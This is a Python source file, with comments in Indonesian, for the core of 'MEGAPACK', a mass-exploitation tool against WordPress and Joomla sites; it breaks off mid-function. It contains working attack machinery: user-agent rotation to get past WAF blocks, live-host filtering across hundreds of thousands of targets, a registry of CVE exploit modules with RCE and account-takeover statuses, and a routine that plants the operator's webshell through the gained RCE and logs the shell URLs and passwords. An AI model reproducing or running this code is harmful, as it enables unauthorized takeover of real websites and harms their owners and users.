#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MEGAPACK — kerangka inti tool unified.

Berisi:
  - Konstanta & warna (auto-off saat bukan TTY / NO_COLOR)
  - Http client dengan retry, timeout adaptif, fallback UA
  - Target: state hasil scan/exploit per (target, cve)
  - Registry: pemuatan modul CVE + metadata, pemisahan status
  - Output: satu baris triage + JSON

Modul CVE individual tinggal menambah file di modules/ dan mendaftarkan diri
via decorator @register — lihat modules/README.md.
"""
from __future__ import annotations

import argparse
import concurrent.futures as cf
import copy
import json
import os
import random
import socket
import re
import string
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

# --------------------------------------------------------------------------
# warna (auto-off bila bukan TTY — penting agar output aman di-grep/CI/pipa)
# --------------------------------------------------------------------------
_NO_COLOR = (not sys.stdout.isatty()) or bool(os.environ.get("NO_COLOR"))
_C = {"vuln": "\033[91m", "ok": "\033[92m", "warn": "\033[93m",
      "info": "\033[94m", "dim": "\033[90m", "rst": "\033[0m"}


def col(tag: str, msg: str) -> str:
    if _NO_COLOR:
        return msg
    return f"{_C.get(tag, '')}{msg}{_C['rst']}"


# --------------------------------------------------------------------------
# status
# --------------------------------------------------------------------------
ST_VULN = "VULN"        # primitif terbukti dapat dicapai
ST_RCE = "RCE"          # eksekusi terverifikasi (outcome terkontrol)
ST_PWN = "PWN"          # takeover akun/priv-esc terverifikasi (admin dibuat)
ST_INFO = "INFO"        # komponen terdeteksi, eksploitabilitas belum dipastikan
ST_CLEAN = "CLEAN"      # komponen tidak terdeteksi / sudah dipatch
ST_SKIP = "SKIP"        # tidak berlaku untuk target ini (prereq tak ada)
ST_ERR = "ERR"          # error jaringan/parsing
ST_UNKNOWN = "UNKNOWN"

_SEVERE = {ST_VULN, ST_RCE, ST_PWN}

# Di atas ambang ini, run_batch() meng-stream hasil (tidak menahan semua Target
# di RAM). 300.000 target x 45 modul = >13 juta dict hasil.
_STREAM_THRESHOLD = 5000
# Pra-filter TCP baru berguna bila daftarnya cukup besar (biaya asyncio setup kecil)
_PREFLIGHT_MIN = 50


def _require_requests():
    try:
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        return requests
    except ImportError:
        print(col("warn", "[!] butuh 'requests': pip install requests"), file=sys.stderr)
        sys.exit(1)


UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]


def rand(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------
class Http:
    """
    Client HTTP dengan:
      - rotasi User-Agent (fallback bila di-403)
      - retry terbatas pada error jaringan/5xx
      - timeout & proxy dapat dikonfigurasi
    Statistik request dihitung untuk laporan akhir.
    """

    def __init__(self, timeout: float = 20.0, proxy: Optional[str] = None,
                 verify_tls: bool = False, verbose: bool = False,
                 retries: int = 1, delay: float = 0.0):
        self.timeout = timeout
        self.verbose = verbose
        self.retries = max(0, retries)
        self.delay = max(0.0, delay)
        self._backoff = 1.0      # back-off adaptif saat 429/503
        self._throttled = 0      # berapa kali server membatasi laju
        self.requests_made = 0
        self.errors = 0
        self._ua_i = 0
        self._requests = _require_requests()
        self.s = self._requests.Session()
        self.s.headers.update({"User-Agent": UAS[0], "Accept": "*/*"})
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.verify = verify_tls

    def _rotate_ua(self):
        self._ua_i = (self._ua_i + 1) % len(UAS)
        self.s.headers["User-Agent"] = UAS[self._ua_i]

    @staticmethod
    def _fatal_transport(exc) -> bool:
        """True untuk error transport yang tidak akan berubah bila diulang."""
        name = type(exc).__name__
        if name in ("NameResolutionError", "InvalidURL", "MissingSchema",
                    "InvalidSchema", "URLRequired", "SSLError", "ProxyError",
                    "UnsupportedProtocol", "ConnectionError"):
            return True
        # requests membungkus penyebabnya; periksa juga rantai cause
        text = f"{name}: {exc}"
        return any(k in text for k in ("Name or service not known",
                                       "nodename nor servname",
                                       "No address associated",
                                       "Max retries exceeded"))

    def _sleep(self):
        if self.delay:
            time.sleep(self.delay)

    def req(self, method: str, url: str, **kw):
        # `timeout` boleh dikirim modul (h.get(url, timeout=12)); jangan biarkan
        # bertabrakan dengan timeout eksplisit di s.request() -> TypeError senyap.
        tmo = kw.pop("timeout", None)
        kw.setdefault("allow_redirects", True)
        last = None
        for attempt in range(self.retries + 1):
            self._sleep()
            try:
                self.requests_made += 1
                r = self.s.request(method, url, timeout=(tmo or self.timeout),
                                   verify=self.verify, **kw)
                if self.verbose:
                    print(col("dim", f"    {method} {url[:110]} -> {r.status_code} ({len(r.content)}b)"))
                # 429/503 -> mundur secara eksponensial: pola ini menandakan
                # pembatasan laju sisi server, dan mengulang segera hanya
                # memperpanjang blokir. UA juga diputar agar tidak jadi sidik jari.
                if r.status_code in (429, 503):
                    self._throttled += 1
                    self._backoff = min(max(self._backoff * 2, 1.0), 30.0)
                    if attempt < self.retries:
                        time.sleep(self._backoff)
                        self._rotate_ua()
                        continue
                if r.status_code == 403 and attempt < self.retries:
                    self._rotate_ua()
                    continue
                if r.status_code < 500 and r.status_code not in (429, 503):
                    # respons normal -> redakan back-off perlahan
                    self._backoff = max(1.0, self._backoff / 2)
                return r
            except Exception as e:
                last = e
                if self.verbose:
                    print(col("dim", f"    {method} {url[:110]} -> ERR {type(e).__name__}"))
                # Kesalahan yang tidak akan berubah dengan pengulangan (DNS tidak
                # resolve, skema salah, sertifikat ditolak) tidak layak diretry:
                # setiap percobaan menambah timeout penuh, sehingga target mati
                # membuat proses menggantung alih-alih gagal cepat.
                if self._fatal_transport(e):
                    break
                if attempt < self.retries:
                    time.sleep(0.4 * (attempt + 1))
                    continue
        self.errors += 1
        if self.verbose and last:
            print(col("dim", f"    -> gagal total: {type(last).__name__}: {last}"))
        return None

    def get(self, url: str, **kw):
        return self.req("GET", url, **kw)

    def post(self, url: str, data=None, files=None, json_body=None, **kw):
        if json_body is not None:
            kw.setdefault("json", json_body)
        return self.req("POST", url, data=data, files=files, **kw)

    def head(self, url: str, **kw):
        return self.req("HEAD", url, **kw)

    def put(self, url: str, **kw):
        return self.req("PUT", url, **kw)

    def patch(self, url: str, **kw):
        return self.req("PATCH", url, **kw)

    def delete(self, url: str, **kw):
        return self.req("DELETE", url, **kw)

    def options(self, url: str, **kw):
        return self.req("OPTIONS", url, **kw)


# --------------------------------------------------------------------------
# util HTTP-level
# --------------------------------------------------------------------------
_BLOCK_MARKERS = (
    "unauthorized request blocked", "not authorised", "not authorized",
    "access denied", "request blocked", "attention required", "just a moment",
    "you have been blocked", "forbidden",
)

_HTML_MARKERS = ("<!doctype", "<html", "<head", "</html>", "<title", "<body")


def looks_like_html(text: str) -> bool:
    """True bila respons tampak berupa halaman HTML, bukan keluaran handler.

    Dipakai modul agar HTTP 200 + halaman HTML (halaman komponen Joomla, atau
    panel blokir WAF) TIDAK dihitung sebagai bukti handler berjalan. Jendela
    diperlebar ke 4000 karakter — dengan potongan pendek (mis. 300) penanda
    seperti <body/<title sering jatuh di luar jendela dan pemeriksaan gagal.
    """
    low = (text or "")[:4000].lower()
    return any(m in low for m in _HTML_MARKERS)


def looks_blocked(text: str) -> bool:
    """True bila respons tampak halaman blokir (WAF/otorisasi) dengan HTTP 200."""
    low = (text or "")[:4000].lower()
    return any(m in low for m in _BLOCK_MARKERS)


def norm_url(u: str) -> str:
    u = (u or "").strip()
    if not u:
        return u
    if not u.startswith(("http://", "https://")):
        # tanpa skema: port 443/8443 menyiratkan https, sisanya http
        hostport = u.split("/", 1)[0]
        port = hostport.rsplit(":", 1)[-1] if ":" in hostport else ""
        u = ("https://" if port in ("443", "8443") else "http://") + u
    return u.rstrip("/")


def json_of(r):
    if r is None:
        return None
    try:
        return r.json()
    except Exception:
        return None


def header_of(r, name: str, default: str = "") -> str:
    if r is None:
        return default
    return r.headers.get(name, default) or default


def server_epoch(h: Http, base: str) -> Optional[int]:
    """Epoch server dari header Date (presisi detik). Sumber anchor waktu."""
    r = h.get(base + "/")
    d = header_of(r, "Date")
    if not d:
        return None
    try:
        from email.utils import parsedate_to_datetime
        return int(parsedate_to_datetime(d).timestamp())
    except Exception:
        return None


def parse_ver(s):
    m = re.search(r"(\d+(?:\.\d+){0,3})", str(s or ""))
    return tuple(int(x) for x in m.group(1).split(".")) if m else None


def ver_le(a, b) -> bool:
    if not a or not b:
        return False
    n = max(len(a), len(b))
    a = tuple(a) + (0,) * (n - len(a))
    b = tuple(b) + (0,) * (n - len(b))
    return a <= b


def ver_lt(a, b) -> bool:
    if not a or not b:
        return False
    n = max(len(a), len(b))
    a = tuple(a) + (0,) * (n - len(a))
    b = tuple(b) + (0,) * (n - len(b))
    return a < b


# --------------------------------------------------------------------------
# Target
# --------------------------------------------------------------------------
@dataclass
class Target:
    url: str
    platform: str = ""                 # wordpress / joomla / unknown
    wp_version: Optional[tuple] = None
    joomla_version: Optional[tuple] = None
    plugins: dict = field(default_factory=dict)   # slug -> versi(string|None)
    components: dict = field(default_factory=dict)  # joomla: com_xxx / ext
    server_epoch: Optional[int] = None
    notes: list = field(default_factory=list)
    results: dict = field(default_factory=dict)   # cve -> {status, detail, evidence}
    _probed: bool = False

    def tag(self, st: str) -> str:
        return col("vuln", st) if st in _SEVERE else st


# --------------------------------------------------------------------------
# Registry modul CVE
# --------------------------------------------------------------------------
@dataclass
class CveModule:
    cve: str
    cluster: str                       # wordpress / joomla_core / joomla_ext
    title: str
    vclass: str
    cvss: str = ""
    severity: str = ""
    cwe: str = ""
    product: str = ""
    versions_affected: str = ""
    status: str = "documented"          # verified | documented | unsupported
    requires: list = field(default_factory=list)   # prereq manusiawi
    check: Optional[Callable] = None    # fn(t, h, opts) -> (status, detail, evidence)
    exploit: Optional[Callable] = None  # fn(t, h, opts) -> (status, detail, evidence)
    notes: str = ""
    exec_suffix: str = ""   # template perintah lewat shell modul, mis. "?t=k&c={cmd}"
    plant: Optional[Callable] = None   # fn(t, h, fname, content) -> url|None
    deploy_ws: Optional[Callable] = None  # fn(t, h, opts) -> dict {url,password,verified}
    # --- adjudikasi klaster (triase dup/mislabel) -------------------------
    # CVE ID ini adalah DUPLIKAT/alias dari CVE lain (sink & fix identik).
    # Saat scan, entri alias TIDAK dijalankan (mencegah pelaporan ganda),
    # tapi tetap terdaftar supaya tetap dikenali operator.
    alias_of: str = ""
    # Modul berstatus 'unsupported' yang tetap perlu alasan eksplisit saat scan
    # (mis. MISLABEL: kelas CVE yang dilaporkan dibantah source). Non-kosong =
    # scan melewati modul dengan alasan ini.
    unsupported_reason: str = ""


REGISTRY: dict = {}


def register(mod: CveModule):
    """Daftarkan modul CVE.

    Penting: saat mp.py dijalankan sebagai script (`python3 mp.py`), `import mp`
    di dalam modul akan membuat instance modul KEDUA, sehingga register() menulis
    ke REGISTRY yang berbeda dari yang dipakai main(). Solusinya: tulis juga ke
    registry milik __main__ bila ada.
    """
    REGISTRY[mod.cve] = mod
    m = sys.modules.get("__main__")
    if m is not None and m is not sys.modules.get(__name__):
        main_reg = getattr(m, "REGISTRY", None)
        if isinstance(main_reg, dict):
            main_reg[mod.cve] = mod
    return mod


def load_modules(package_dir: str):
    """
    Muat semua modul di modules/ secara dinamis.
    Modul memanggil register() saat diimpor.
    """
    import importlib.util
    if not os.path.isdir(package_dir):
        return
    # pastikan root project ada di sys.path agar modul bisa `import mp`
    root = os.path.dirname(os.path.abspath(package_dir))
    if root not in sys.path:
        sys.path.insert(0, root)
    for fn in sorted(os.listdir(package_dir)):
        if not fn.endswith(".py") or fn.startswith("_"):
            continue
        path = os.path.join(package_dir, fn)
        name = "mp_mod_" + fn[:-3]
        m = None
        try:
            spec = importlib.util.spec_from_file_location(name, path)
            m = importlib.util.module_from_spec(spec)
            sys.modules[name] = m
            spec.loader.exec_module(m)
        except Exception as e:
            import traceback
            print(col("warn", f"[!] modul {fn} gagal dimuat: {type(e).__name__}: {e}"), file=sys.stderr)
            if os.environ.get("MP_DEBUG"):
                traceback.print_exc()
            sys.modules.pop(name, None)
            continue
        if m is None:
            continue
        # modul boleh expose register_all() untuk mendaftarkan banyak CVE
        fn_reg = getattr(m, "register_all", None)
        if callable(fn_reg):
            try:
                fn_reg()
            except Exception as e:
                import traceback
                print(col("warn", f"[!] register_all() {fn} gagal: {type(e).__name__}: {e}"), file=sys.stderr)
                if os.environ.get("MP_DEBUG"):
                    traceback.print_exc()

        # teruskan EXEC_SUFFIX dari modul Python ke CveModule terkait (dipakai
        # --deploy-shell untuk menjalankan perintah lewat shell hasil exploit).
        suf = getattr(m, "EXEC_SUFFIX", None)
        if suf:
            regs = [REGISTRY]
            main_reg = getattr(sys.modules.get("__main__"), "REGISTRY", None)
            if isinstance(main_reg, dict) and main_reg is not REGISTRY:
                regs.append(main_reg)
            for cve in (getattr(m, "CVES", None) or []):
                for r in regs:
                    mm = r.get(cve)
                    if mm is not None:
                        mm.exec_suffix = suf
        plant_fn = getattr(m, "PLANT_FN", None)
        if callable(plant_fn):
            regs = [REGISTRY]
            main_reg = getattr(sys.modules.get("__main__"), "REGISTRY", None)
            if isinstance(main_reg, dict) and main_reg is not REGISTRY:
                regs.append(main_reg)
            for cve in (getattr(m, "CVES", None) or []):
                for r in regs:
                    mm = r.get(cve)
                    if mm is not None:
                        mm.plant = plant_fn


# --------------------------------------------------------------------------
# deteksi platform (shared, dipakai banyak modul)
# --------------------------------------------------------------------------
WP_PATHS = ("/wp-login.php", "/wp-includes/js/wp-emoji-release.min.js",
            "/wp-content/", "/wp-admin/", "/xmlrpc.php")
JOOMLA_PATHS = ("/administrator/", "/components/", "/modules/",
                "/language/en-GB/en-GB.xml", "/administrator/manifests/files/joomla.xml")


def detect_platform(t: Target, h: Http) -> str:
    """Heuristik platform dari SATU request halaman depan (redirect diikuti).

    Biaya per target menentukan segalanya untuk mass scan. Satu GET ke "/" sudah
    cukup: penanda khas WordPress (wp-content/wp-includes/wp-json) vs Joomla
    (option=com_/media/system/js/ dan struktur /administrator/).

    PENTING: banyak target membalas 301/302 ke www/kanonik. Tanpa mengikuti
    redirect, badan halaman kosong -> platform "unknown" -> semua modul Joomla
    tetap berjalan dan membakar request. Jadi redirect WAJIB diikuti.

    "unknown" hanya untuk host yang benar-benar tidak dapat dipastikan; modul
    bergate menerimanya sebagai lanjut, tetapi host yang tidak terjangkau
    ditangani lebih awal oleh pre-flight, bukan di sini.
    """
    if t.platform:
        return t.platform
    r = h.get(t.url + "/")
    if r is None:
        t.platform = "unknown"
        return t.platform
    body = (r.text or "")[:200000].lower()
    wp = 0
    joomla = 0
    # Penanda kuat (satu saja cukup).
    if "wp-content/" in body or "wp-includes/" in body:
        wp += 3
    if "option=com_" in body or "/media/system/js/" in body:
        joomla += 3
    # Penanda lemah (dua-duanya sering muncul di template umum).
    if "wordpress" in body:
        wp += 1
    if "joomla" in body:
        joomla += 1
    if "<meta name=\"generator\" content=\"joomla" in body:
        joomla += 3
    if "<meta name=\"generator\" content=\"wordpress" in body:
        wp += 3
    if wp == 0 and joomla == 0:
        rr = h.get(t.url + "/administrator/")
        rb = (rr.text or "")[:50000].lower() if rr is not None else ""
        if rr is not None and rr.status_code in (200, 302, 303, 401, 403) and (
                "joomla" in rb or "option=com_login" in rb):
            joomla += 2
    t.platform = "wordpress" if wp > joomla else ("joomla" if joomla > wp else "unknown")
    return t.platform


def wp_version(t: Target, h: Http) -> Optional[tuple]:
    if t.wp_version:
        return t.wp_version
    r = h.get(t.url + "/")
    if r is not None:
        m = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', r.text)
        if m:
            t.wp_version = parse_ver(m.group(1))
            return t.wp_version
    r = h.get(t.url + "/feed/")
    if r is not None and "<generator>" in r.text:
        m = re.search(r"<generator>[^<]*wordpress\.org/\?v=([0-9.]+)", r.text, re.I)
        if m:
            t.wp_version = parse_ver(m.group(1))
    return t.wp_version


def plugin_installed(t: Target, h: Http, slug: str, asset: Optional[str] = None) -> bool:
    """Deteksi plugin via readme/aset. Cache hasilnya."""
    if slug in t.plugins:
        return t.plugins[slug] is not False
    candidates = []
    if asset:
        # Beberapa modul mengirim aset tanpa "/" di depan (mis.
        # "slug/main.php") -> `t.url + asset` jadi "http://hostslug/..." =
        # InvalidURL (1 error sia-sia tiap scan). Normalisasi leading-slash di
        # sini menutup semua pemanggil sekaligus; verdict tak berubah karena
        # fallback readme/CHANGELOG tetap jalan.
        candidates.append(asset if asset.startswith("/") else "/" + asset)
    candidates += [f"/wp-content/plugins/{slug}/readme.txt",
                   f"/wp-content/plugins/{slug}/CHANGELOG.md"]
    for p in candidates:
        r = h.get(t.url + p)
        # 200 + isi nyata saja. Halaman redirect/soft-404 (301/302 atau body
        # yang tidak memuat marker plugin) TIDAK boleh dihitung sebagai terpasang.
        if r is None or r.status_code != 200 or len(r.content) == 0:
            continue
        txt = r.text or ""
        # readme.txt plugin selalu memuat header "=== " atau "Stable tag:";
        # file .php plugin memuat "Plugin Name:". Body soft-404 tidak.
        if p.endswith("readme.txt") or p.endswith("CHANGELOG.md"):
            if "Stable tag" not in txt and not txt.lstrip().startswith("==="):
                continue
        elif p.endswith(".php") and "Plugin Name:" not in txt:
            continue
        else:
            # Aset statis (css/js/img/...). Bila h.get MENGIKUTI redirect, halaman
            # soft-404 WordPress/tema membalas 200 ber-isi HTML -> keliru dihitung
            # "plugin terpasang". Untuk aset, wajib bukan dokumen HTML.
            ctype = (r.headers.get("Content-Type", "") or "").lower()
            head = txt.lstrip()[:220].lower()
            if "text/html" in ctype:
                continue
            if head.startswith("<!doctype html") or head.startswith("<html"):
                continue
        t.plugins[slug] = True
        return True
    t.plugins[slug] = False
    return False


def plugin_version(t: Target, h: Http, slug: str) -> Optional[tuple]:
    """Versi plugin: header .php (otoritatif) > CHANGELOG.md > readme Stable tag."""
    if slug in t.plugins and isinstance(t.plugins[slug], tuple):
        return t.plugins[slug]
    r = h.get(t.url + f"/wp-content/plugins/{slug}/{slug}.php")
    if r is not None and r.status_code == 200:
        m = re.search(r"\*\s*Version\s*:\s*([0-9][0-9.]*)", r.text, re.I)
        if m:
            v = parse_ver(m.group(1))
            t.plugins[slug] = v
            return v
    r = h.get(t.url + f"/wp-content/plugins/{slug}/CHANGELOG.md")
    if r is not None and r.status_code == 200:
        m = re.search(r"^#+\s*v?([0-9][0-9.]*)", r.text, re.M)
        if m:
            v = parse_ver(m.group(1))
            t.plugins[slug] = v
            return v
    r = h.get(t.url + f"/wp-content/plugins/{slug}/readme.txt")
    if r is not None and r.status_code == 200:
        m = re.search(r"Stable tag\s*:\s*([0-9][0-9.]*)", r.text, re.I)
        if m:
            v = parse_ver(m.group(1))
            t.plugins[slug] = v
            return v
    return None


# --------------------------------------------------------------------------
# hasil
# --------------------------------------------------------------------------
def record(t: Target, cve: str, status: str, detail: str = "", evidence: str = ""):
    t.results[cve] = {"status": status, "detail": detail, "evidence": evidence}


def _shell_lines(results) -> list[str]:
    """Satu baris per shell yang BERFUNGSI: URL, password, verifikasi.

    Sumber: t.results[cve]["deployed_shell"] (hasil --deploy-shell) atau URL
    shell bawaan modul pada evidence (pola `url=http...`) untuk RCE yang tidak
    butuh tanam berkas.
    """
    out = []
    for t in results:
        for cve, r in sorted((t.results or {}).items()):
            dep = r.get("deployed_shell") or {}
            if dep.get("url"):
                pw = dep.get("password") or ""
                ok = "OK" if dep.get("verified") else "UNVERIFIED"
                out.append(f"{t.url}\t{cve}\t{dep['url']}\tpassword={pw}\t{ok}")
                continue
            if r.get("status") in (ST_PWN, ST_RCE):
                m = _SHELL_URL_RE.search(r.get("evidence") or "")
                if m:
                    out.append(f"{t.url}\t{cve}\t{m.group(1)}\tpassword=-\tEXEC-ONLY")
    return out


def write_shell_file(path: str, results) -> int:
    """Tulis shell.txt: shell yang dapat dibuka operator di browser."""
    lines = _shell_lines(results)
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"# MEGAPACK shell — {len(lines)} shell berfungsi\n")
            f.write("# format: TARGET\tCVE\tSHELL_URL\tpassword\tstatus\n")
            if not lines:
                f.write("# (tidak ada shell; RCE tidak menghasilkan URL atau deploy gagal)\n")
            for ln in lines:
                f.write(ln + "\n")
        print(col("ok", f"  [+] shell -> {path} ({len(lines)})"))
    except OSError as e:
        print(col("warn", f"  [!] gagal menulis {path}: {e}"))
        return 0
    return len(lines)


def emit_result(t: Target, mod: CveModule, r: dict, quiet: bool = False):
    st = r.get("status", ST_UNKNOWN)
    if quiet and st not in _SEVERE:
        return
    tag = col("vuln", st) if st in _SEVERE else st
    line = f"{tag:<22} {mod.cve:<18} {t.url}"
    detail = r.get("detail") or ""
    if detail:
        line += f"  {detail}"
    print(line)
    ev = r.get("evidence") or ""
    if ev:
        print(col("dim", f"      - {ev}"))


# --------------------------------------------------------------------------
# mesin scan
# --------------------------------------------------------------------------
def preflight_alive(targets: list, concurrency: int = 1000, timeout: float = 6.0,
                    quiet: bool = False) -> list:
    """Saring target dengan connect TCP paralel SEBELUM modul apa pun berjalan.

    Kenapa perlu: tanpa ini setiap host mati menanggung timeout penuh PER MODUL
    (45x). Terukur pada 20.000 host mati: 201 s -> 11 s.

    Kenapa RETRY berlapis (penting, jangan disederhanakan):
      Satu pass cepat dengan timeout pendek MEMBUANG host yang sebenarnya hidup.
      Terukur pada 5.000 target nyata: pass 8000-conc/2,5 s hanya menemukan 61
      host, sedangkan pass 2000-conc/4 s menemukan 176 — 129 host nyata hilang.
      Kehilangan target nyata jauh lebih mahal daripada menunggu, jadi:
        pass 1  cepat, konkurensi tinggi, timeout pendek  -> buang mayoritas mati
        pass 2  sisa, konkurensi sedang, timeout lebih longgar
        pass 3  sisa, konkurensi rendah, timeout longgar   -> pulihkan yang lambat
      Yang tetap gagal setelah 3 lapis benar-benar mati/tidak merespons.
    """
    import asyncio
    from urllib.parse import urlparse

    pairs = []
    for raw in targets:
        u = norm_url(raw) if not str(raw).startswith("http") else raw
        try:
            pr = urlparse(u)
            host = pr.hostname
            port = pr.port or (443 if pr.scheme == "https" else 80)
        except Exception:  # noqa: BLE001
            continue
        if host:
            pairs.append((raw, host, port))
    if not pairs:
        return list(targets)

    total = len(pairs)
    t_start = time.time()
    checked = [0]

    def _round(items, conc, tmo, label) -> list:
        """Satu lapis probe; return item yang HIDUP."""
        if not items:
            return []
        sem = asyncio.Semaphore(max(1, conc))
        live: list = []
        maybe: list = []

        async def _one(item):
            async with sem:
                checked[0] += 1
                if not quiet and (checked[0] % 2000 == 0 or checked[0] == total):
                    tty = sys.stderr.isatty()
                    el = time.time() - t_start
                    rate = checked[0] / el if el > 0 else 0
                    msg = (f"  [pra-filter {label} {checked[0]}/{total} "
                           f"({100.0 * checked[0] / total:4.1f}%) {rate:5.0f}/s]")
                    print((f"\r{msg:<72}" if tty else msg),
                          end="" if tty else "\n", file=sys.stderr, flush=True)
                try:
                    rd, wr = await asyncio.wait_for(
                        asyncio.open_connection(item[1], item[2]), timeout=tmo)
                    wr.close()
                    try:
                        await wr.wait_closed()
                    except Exception:  # noqa: BLE001
                        pass
                    live.append(item[0])
                except (asyncio.TimeoutError, TimeoutError):
                    # Bisa jadi host hidup tapi lambat -> LAYAK di-retry.
                    maybe.append(item[0])
                except (ConnectionRefusedError, OSError) as e:
                    # RST/refused/host-unreachable/DNS gagal = PASTI mati.
                    # Me-retry ini membuang 2x timeout per host dan itulah biaya
                    # terbesar pada daftar 300k (mayoritas target mati).
                    if e.__class__.__name__ in ("ConnectionRefusedError",
                                                "gaierror"):
                        pass
                    else:
                        maybe.append(item[0])
                except Exception:  # noqa: BLE001
                    maybe.append(item[0])

        async def _run():
            await asyncio.gather(*(_one(it) for it in items))

        try:
            asyncio.run(_run())
        except RuntimeError:
            loop = asyncio.new_event_loop()
            try:
                loop.run_until_complete(_run())
            finally:
                loop.close()
        return live, maybe

    # 3 lapis: cepat -> sedang -> longgar. Lapis berikutnya hanya menerima sisa.
    # Konkurensi TETAP tinggi di semua lapis: yang mahal adalah timeout tiap
    # probe, bukan jumlah koneksi paralel. Menurunkan konkurensi di lapis retry
    # membuat total waktu meledak (terukur 341 s untuk 5.000 target).
    # Hanya host yang GAGAL KARENA TIMEOUT yang di-retry; refusal/host-unreachable
    # sudah pasti mati. Ini memotong biaya 300k secara drastis.
    by_raw = {p[0]: p for p in pairs}
    alive, maybe = _round(pairs, concurrency, timeout, "cap")
    more, maybe2 = _round([by_raw[r] for r in maybe], concurrency,
                          max(timeout + 4.0, 8.0), "retry1")
    alive += more
    alive += _round([by_raw[r] for r in maybe2], concurrency,
                    max(timeout + 8.0, 12.0), "retry2")[0]

    if not quiet and sys.stderr.isatty():
        print("\r" + " " * 74 + "\r", end="", file=sys.stderr, flush=True)
    if not quiet:
        print(col("info", f"[*] pra-filter TCP: {len(alive)}/{len(targets)} target hidup "
                         f"({len(targets) - len(alive)} gugur, {time.time() - t_start:.0f}s)"),
              flush=True)
    save_to = getattr(preflight_alive, "_save_to", None)
    if save_to and alive:
        try:
            with open(save_to, "w", encoding="utf-8") as f:
                f.write("\n".join(alive) + "\n")
            if not quiet:
                print(col("ok", f"  [+] target hidup -> {save_to} "
                                f"(pakai lagi: --targets {save_to} --no-preflight)"),
                      flush=True)
        except OSError as e:
            if not quiet:
                print(col("warn", f"  [!] gagal menulis {save_to}: {e}"), flush=True)
    return alive


def _host_unreachable(t: Target, h: Http) -> str:
    """Return alasan bila host tidak dapat dijangkau, '' bila sepertinya bisa.

    Tanpa ini, target mati menanggung timeout DNS/koneksi penuh PER REQUEST dan
    per modul, sehingga satu host buruk menahan seluruh batch. Satu probe murah
    di depan memutus biaya itu.
    """
    from urllib.parse import urlparse
    try:
        host = urlparse(t.url).hostname
        port = urlparse(t.url).port or (443 if t.url.startswith("https") else 80)
    except Exception:
        return ""
    if not host:
        return "URL tanpa host"
    try:
        socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except OSError as e:
        return f"DNS/resolve gagal: {e.__class__.__name__}"
    # DNS saja tidak cukup: target berupa IP selalu "resolve", lalu SETIAP modul
    # menanggung timeout penuh. Satu connect murah di sini memutus 45x timeout.
    tmo = min(float(getattr(h, "timeout", 8.0) or 8.0), 6.0)
    try:
        with socket.create_connection((host, port), timeout=tmo):
            return ""
    except OSError as e:
        return f"koneksi gagal: {e.__class__.__name__}"


def prep_target(t: Target, h: Http, opts):
    """Probe awal sekali per target: platform, versi, epoch server."""
    if t._probed:
        return
    t._probed = True
    reason = _host_unreachable(t, h)
    if reason:
        t.notes.append(f"host tidak terjangkau ({reason})")
        return
    detect_platform(t, h)
    if t.platform == "wordpress":
        wp_version(t, h)
    t.server_epoch = server_epoch(h, t.url)


_SHELL_URL_RE = re.compile(r"url=(https?://[^\s,;)]+)")
_DEPLOY_TOOL = None


def _load_deploy_tool():
    """Muat tools/deploy_shell.py tanpa paket (tools/ bukan paket Python)."""
    global _DEPLOY_TOOL
    if _DEPLOY_TOOL is None:
        import importlib.util
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools", "deploy_shell.py")
        spec = importlib.util.spec_from_file_location("deploy_shell", path)
        _DEPLOY_TOOL = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(_DEPLOY_TOOL)
    return _DEPLOY_TOOL


_SHELL_FLUSH_LOCK = threading.Lock()


def _shell_flush(target: str, cve: str, r: dict, flag: str) -> None:
    """Tulis satu baris shell ke file target flush (thread-safe)."""
    path = getattr(maybe_deploy_shell, "_flush_to", None)
    if not path or not r.get("url"):
        return
    line = f"{target}\t{cve}\t{r['url']}\tpassword={r['password']}\t{flag}"
    with _SHELL_FLUSH_LOCK:
        new = not os.path.exists(path)
        try:
            with open(path, "a", encoding="utf-8") as f:
                if new:
                    f.write("# MEGAPACK shell (live flush)\n")
                    f.write("# format: TARGET\\tCVE\\tSHELL_URL\\tpassword\\tstatus\n")
                f.write(line + "\n")
        except OSError:
            pass


def maybe_deploy_shell(mod, evidence, args, t, h=None):
    """Pasang webshell milik kita lewat RCE yang baru saja didapat.

    Dua jalur:
      1. modul punya `plant(t, h, fname, content) -> url` -> tanam berkas langsung
         (blob base64 + stub dekoder). Cocok untuk sink yang bisa menulis berkas
         berisi bebas, mis. JCE profiles.import.
      2. modul punya EXEC_SUFFIX -> jalankan perintah lewat shell bawaan modul,
         URL shell diambil dari baris bukti (pola `url=http...`).
    """
    if not getattr(args, "deploy_shell", False):
        return
    if h is None:
        # jalur chain/streaming memanggil kita tanpa Http: buat sendiri.
        h = Http(timeout=max(float(getattr(args, "timeout", 20.0) or 20.0), 20.0),
                 proxy=getattr(args, "proxy", None),
                 verify_tls=getattr(args, "verify_tls", True),
                 verbose=False, delay=0.0)
    plant = getattr(mod, "plant", None)
    suffix = getattr(mod, "exec_suffix", "") or getattr(mod, "EXEC_SUFFIX", None)
    name = getattr(args, "deploy_name", None)
    pw = getattr(args, "deploy_password", None)
    tmo = max(float(getattr(args, "timeout", 20.0) or 20.0), 20.0)
    dws = getattr(mod, "deploy_ws", None)
    try:
        t._deploy_opts = args   # dipakai plant() modul yang butuh sesi backend
        tool = _load_deploy_tool()
        if callable(dws) and h is not None:
            r = dws(t, h, args)
        elif callable(plant) and h is not None:
            r = tool.deploy_via_plant(plant, t, h, name, pw, None, True, tmo)
        elif suffix:
